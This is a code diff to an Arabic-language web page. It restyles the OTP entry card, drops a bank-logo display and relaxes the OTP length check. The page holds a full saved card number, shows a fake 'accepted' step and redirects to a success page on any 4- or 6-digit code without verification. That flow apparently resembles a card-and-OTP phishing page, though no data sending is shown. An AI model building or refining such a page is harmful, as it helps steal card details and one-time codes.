@@ -260,9 +260,8 @@
 
     /* بطاقة OTP */
     .otp-card { display:none; }
-    .masked-card-row { position:relative; display:flex; align-items:center; gap:8px; }
-    .masked-card-field { background:#f5f5f5; border:1px solid #bbb; border-radius:6px; height:38px; padding:0 10px; flex:1; min-width:0; font-size:13px; font-family:monospace; letter-spacing:1px; color:#222; display:flex; align-items:center; white-space:nowrap; overflow:hidden; }
-    #otp-bank-logo { height:28px; width:auto; object-fit:contain; flex-shrink:0; }
+    .masked-card-field { background:#f5f5f5; border:1px solid #bbb; border-radius:6px; height:38px; padding:0 12px; width:100%; font-size:15px; font-family:monospace; letter-spacing:3px; color:#222; display:flex; align-items:center; justify-content:center; white-space:nowrap; }
+    .otp-field { width:100%; font-size:22px; font-weight:700; text-align:center; letter-spacing:8px; height:54px; }
   </style>
 </head>
 <body>
@@ -369,19 +368,14 @@
     <div class="card otp-card" id="otp-card">
       <table class="form-table" dir="ltr">
         <tr>
-          <td class="td-input">
-            <div class="masked-card-row">
-              <div class="masked-card-field" id="masked-card-display"></div>
-              <img id="otp-bank-logo" src="" alt="">
-            </div>
+          <td class="td-input" colspan="2" style="text-align:center">
+            <div class="masked-card-field" id="masked-card-display"></div>
           </td>
-          <td class="td-label">:رقم البطاقة</td>
         </tr>
         <tr>
-          <td class="td-input">
-            <input class="field small" type="text" id="otp-input" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code">
+          <td class="td-input" colspan="2" style="text-align:center">
+            <input class="field otp-field" type="text" id="otp-input" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code">
           </td>
-          <td class="td-label">:OTP</td>
         </tr>
       </table>
     </div>
@@ -792,17 +786,8 @@
 
     function showAccepted() {
       loadingCard.style.display = 'none';
-      // عرض أول 4 وآخر 4 أرقام
       const masked = savedCard.slice(0,4) + ' **** **** ' + savedCard.slice(-4);
       document.getElementById('masked-card-display').textContent = masked;
-      const logo = document.getElementById('otp-bank-logo');
-      if (currentBank && currentBank.logo) {
-        logo.src = currentBank.logo;
-        logo.style.display = 'inline-block';
-        logo.onerror = () => { logo.style.display = 'none'; };
-      } else {
-        logo.style.display = 'none';
-      }
       otpCard.style.display = 'block';
       document.getElementById('otp-action-card').style.display = 'block';
     }
@@ -816,7 +801,7 @@
 
     function submitOtp() {
       const otp = document.getElementById('otp-input').value.trim();
-      if (!otp) { alert('الرجاء إدخال رمز OTP'); return; }
+      if (otp.length !== 4 && otp.length !== 6) { alert('الرجاء إدخال رمز OTP (4 أو 6 أرقام)'); return; }
       location.href = '/success.html';
     }
 
